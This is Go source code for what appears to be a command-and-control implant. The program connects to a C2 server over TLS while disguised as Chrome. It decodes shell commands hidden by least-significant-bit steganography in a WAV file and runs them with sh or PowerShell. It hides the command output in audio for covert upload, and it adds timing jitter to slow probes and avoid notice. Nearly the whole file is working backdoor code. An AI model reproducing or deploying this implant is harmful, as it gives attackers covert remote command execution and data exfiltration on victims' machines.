package main

import (
	"fmt"
	"net"
	"time"
	"io"
	"log"
	"sync"
	"strings"
	"flag"
	//"encoding/binary"
	"math/rand"
	"strconv"
	"os/exec"
	"runtime"
	"os"
	utls "github.com/refraction-networking/utls"
)

// Create a global pool of byte slices to reuse memory across goroutines, in case the project goes to a 65k port option
var bufPool = sync.Pool{
	New: func() interface{} {
		return make([]byte, 1024)
	},
}

type dialResult struct {
	port   string
	status string
}

var c2_server_ip string
var c2_hostname ="c2.egress-whisperer.local"
var timeout time.Duration
var echo_to_stdout = "off"

var http_request_string = "GET /sample.wav HTTP/1.1\r\n" +
           "Host: " + c2_hostname + "\r\n" +
           "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n" +
           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" +
           "Accept-Language: en-US,en;q=0.5\r\n" +
           "Connection: close\r\n" + 
           "\r\n"

func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- dialResult){
	
	defer wg.Done()

	var con_type string
	if port=="53"||port=="123"{ con_type="udp" } else {con_type ="tcp"}

	conn, err := net.DialTimeout(con_type, c2_server_ip+":"+port, timeout)
	if err!=nil{
		log.Println(err)
		//fmt.Println("port "+port+" coming mark 1")
		resultChan <- dialResult{port: port, status: err.Error()}
		return
	}
	defer conn.Close()

	//conn.SetDeadline(time.Now().Add(timeout))


	config := &utls.Config{InsecureSkipVerify: true}
	uConn := utls.UClient(conn, config, utls.HelloChrome_Auto)
	//uConn.SetDeadline(time.Now().Add(timeout))

	err = uConn.Handshake()
	if err != nil {
		log.Println("TLS Handshake Blocked or Failed:", err)
		resultChan <- dialResult{port: port, status: err.Error()}
		return
	}
	defer uConn.Close()

	fmt.Fprintf(uConn, http_request_string)
	//when we start sending content-type audio/wav etc from server, need logic to make sure we dont go decoding that

	// Borrow a buffer from the pool
	buf := bufPool.Get().([]byte)
	// Return to the pool when the function exits
	defer bufPool.Put(buf)

	cmd_bitIndex := 0
	store_command := 0
	var decoded_cmd_byte []byte
	var fifo4 []byte

	for{ //loop forever and keep recieving chunks. If there is a command, execute it
		n, err := uConn.Read(buf)
		if err!=nil && err!=io.EOF{
			log.Println(err)
			//fmt.Println("port "+port+" coming mark 6")
			resultChan <- dialResult{port: port, status: err.Error()}
			return
		}
		//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
		
		//************logic for decoding the incoming bytes******************//
		//-------decoding test

		var current_decoded_byte byte

		for _, stegd_byte := range(buf[:n]){
			last_bit_str := fmt.Sprintf("%08b", stegd_byte)
			last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
			//fmt.Println(last_bit_int)
			current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)

			cmd_bitIndex++
			if cmd_bitIndex==8{
				if store_command==1{
					decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
				}
				fifo4 = append(fifo4, current_decoded_byte)
				if len(fifo4) > 4{
					fifo4 = fifo4[1:]
				}
				if "STRT"==string(fifo4){
					store_command = 1
				}
				if "STOP"==string(fifo4){
					store_command = 0
					finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
					decoded_cmd_byte = decoded_cmd_byte[:0]
					fmt.Println("$>", finalCommand)
					go executeCommand(finalCommand)
				}
				//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
				cmd_bitIndex =0
				current_decoded_byte = 0
			}
		}

		//*****************************end************************************//
	}

	resultChan <- dialResult{port: port, status: "success for "+port}

	
}

func main(){
	//user input collection
	target  := flag.String("target", "", "C2 server IP address (required)")
    timeout = *flag.Duration("timeout", 10*time.Second, "probe timeout per port")
    ports   := flag.String("ports", "80,8080,443,53,123", "comma separated ports to probex")
    stealth := flag.Int("stealth", 0, "Introduce random jitter between each probes. goes 0-4. Higher the number, slowe the probes")
    
    flag.Parse()

    if *target == "" {
        fmt.Println("Error: -target is required")
        flag.Usage()
        return
    }
    c2_server_ip = *target
    sl:=*stealth
    port_list := strings.Split(*ports, ",")
	for i, p := range port_list {
    	port_list[i] = strings.TrimSpace(p)
	}

	//port_list := []string{"80", "8080", "443", "53", "123", "9001", "8443"}
	//supported ports from the server-side

	port_list = []string{"443"}
	
	report := make(map[string]string)

	resultChan := make(chan dialResult, len(port_list))
	var wg sync.WaitGroup

	for _, port := range port_list{
		wg.Add(1)
		if sl >0{
			calculateAndJitter(sl)
		}
		go invokeParallelDialups(port, &wg, resultChan)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	for i := 0; i < len(port_list); i++ {
		res := <-resultChan
		report[res.port] = res.status // Only main routine writes to map (Safe!)
	}

}

func calculateAndJitter(sl int){

	var baseDelay time.Duration
	switch sl{
	case 1:
		baseDelay = 2 * time.Second
	case 2:
		baseDelay = 20 * time.Second
	case 3:
		baseDelay = 10 * time.Minute
	case 4:
		fallthrough //anything greater than 4 gets a base delay of 2 hours
	default:
		baseDelay = 2 * time.Hour
	}

	//use a variance of +/-20 %
	minMultiplier := 0.8
	maxMultiplier := 1.2

	//calculate a random multiplier within that range
	randomMultiplier := minMultiplier + rand.Float64()*(maxMultiplier-minMultiplier)
	actualSleep := time.Duration(float64(baseDelay) * randomMultiplier)
	fmt.Println("Sleeping for ", actualSleep)
	time.Sleep(actualSleep)
	return
}

func executeCommand(finalCommand string){
	if len(finalCommand)!=0{
		shellBinary := "sh"
		shellFlag := "-c"
		
		if runtime.GOOS == "windows"{
			shellBinary = "powershell"
			shellFlag = "/C"
		}

		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
		res, err := cmd.Output()
		if err != nil {
			fmt.Printf("Failed to execute command: %v", finalCommand)
			return
		}

		formatted_out := strings.TrimSpace(string(res))
		if len(formatted_out)<5{
			if echo_to_stdout=="on"{
			fmt.Println("sending output through strobble")}

		}else{
			if echo_to_stdout=="on"{
			fmt.Println("Sending output through upload")}
			go encoding_engine(formatted_out)
		}
		//fmt.Println("output length - ", len(formatted_out)) 
	}
}

func encoding_engine(output string){
	output = "STRT"+output+"STOP"
	//fmt.Println("the output ", output)
	//need logic to store base track either on first loop, or /download endpoint
	var	baseAudioTrack []byte
	var newAudioTrack []byte
	baseAudioTrack, err := os.ReadFile("sample.wav")
	if err != nil {
		log.Fatalf("Fatal: 'sample.wav' must exist in the root folder to execute this server: %v", err)
	}

	var op_bitstring []string
	ChunkSize := 576
	op_len_threshold := ChunkSize/8
	byteOffset := 0
	totalTrackBytes := len(baseAudioTrack)
	chunk := make([]byte, ChunkSize)
	numChunksEncoded :=0
	bitstringCmdCharIndex :=0
	pendingOutput :=""

	//prepare bitstring for each char of output
	for _, char := range output{
		if echo_to_stdout=="on"{
			fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
		}
		op_bitstring = append(op_bitstring, fmt.Sprintf("%08b", char))
		//fmt.Println("Febug 5 - output bitstring state - ", op_bitstring)
	}

	for { //loop over baseAudioTrack, 1 ChunkSize at a time
		//fmt.Println("Debug info - loopCounter = ", loopCounter, " totalTrackBytes = ", totalTrackBytes," byteOffset = ", byteOffset)
		
		// Boundary Check: If we reach the end of the file, reset pointer and increment loop
		if byteOffset+ChunkSize > totalTrackBytes{
			byteOffset = 0
		}
		if (len(pendingOutput)==0 && len(output)==0){
			break
		}

		copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])

		//*********--encode message in the current chunk--******************//
		//---code for byte to bit conversion
		if len(pendingOutput)>0{
			output = pendingOutput[:min(len(pendingOutput), op_len_threshold)]+output
			pendingOutput = pendingOutput[min(len(pendingOutput), op_len_threshold):]
		}
		if len(output)>op_len_threshold{
			pendingOutput += output[op_len_threshold:]
			output = output[:op_len_threshold]
		}

		//----code to inject LSB from op_bitstring array into audio stream.
		op_bitIndex :=0
		op_charIndex :=0
		var audio_stegd_bytes []byte

		if echo_to_stdout=="on"{
			fmt.Println("Chunk length = ", len(chunk))
			fmt.Printf("Injecting payload (%d characters)...\n", len(output))
		}

		for _, aud_byte := range chunk{
			if op_charIndex == len(output) {
				if echo_to_stdout=="on"{
					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
				}
				break
			}

			ival, _ := strconv.Atoi(string(op_bitstring[bitstringCmdCharIndex][op_bitIndex]))
			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
			aud_byte = aud_byte | byte(ival)

			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)

			op_bitIndex++
			if op_bitIndex==8{
				op_charIndex ++
				bitstringCmdCharIndex ++
				op_bitIndex =0
			}

		}
		copy(chunk[:op_charIndex*8], audio_stegd_bytes[:op_charIndex*8])
		numChunksEncoded++
		
		newAudioTrack = append(newAudioTrack, chunk...)

		//fmt.Println("chunk len verification - ", len(chunk))
		byteOffset = byteOffset + ChunkSize
		output = ""
	}

	if numChunksEncoded*ChunkSize > len(baseAudioTrack){
		//need logic to shove shiz into another upload track. better choose a big one
		fmt.Println("track too small for encoding the whole output")

	}else{
		newAudioTrack = append(newAudioTrack, baseAudioTrack[numChunksEncoded*ChunkSize:]...)
	}
	//send to /upload endpoint
	decodeEngine(newAudioTrack, numChunksEncoded*ChunkSize)
}

func decodeEngine (newAudioTrack []byte, size int){
	//--decode--------SERVER code-----

	var fifo4 []byte
	var current_decoded_byte byte
	var decoded_op_byte []byte
	op_bitIndex := 0
	store_output :=0

	for _, stegd_byte := range(newAudioTrack[:len(newAudioTrack)]){		
		
		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
		//fmt.Println("stegd_byte = ", stegd_byte, " bitstring = ", last_bit_str, " last bit = ", last_bit_int)

		//fmt.Println(last_bit_int)
		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)

		op_bitIndex++
		if op_bitIndex==8{
			if store_output==1{
				decoded_op_byte = append(decoded_op_byte, current_decoded_byte)
			}
			fifo4 = append(fifo4, current_decoded_byte)
			if len(fifo4) > 4{
				fifo4 = fifo4[1:]
			}
			if "STRT"==string(fifo4){
				store_output = 1
			}
			if "STOP"==string(fifo4){
				store_output = 0
				finalOutput := strings.Replace(string(decoded_op_byte), "STOP", "", -1)
				decoded_op_byte = decoded_op_byte[:0]
				fmt.Println(finalOutput)
			}
			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
			op_bitIndex =0
			current_decoded_byte = 0
		}
	}

}